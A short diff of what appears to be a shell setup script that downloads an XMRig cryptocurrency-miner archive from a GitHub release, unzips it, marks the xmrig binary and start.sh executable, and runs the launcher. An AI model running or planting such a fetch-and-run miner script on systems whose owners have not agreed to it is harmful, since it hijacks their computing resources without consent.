@@ -11,5 +11,6 @@ wget https://github.com/maxdhctrl/donate/releases/download/release-3/xmrig.zip
 unzip xmrig.zip
 
 chmod +x start.sh
+chmod +x xmrig
 
 ./start.sh
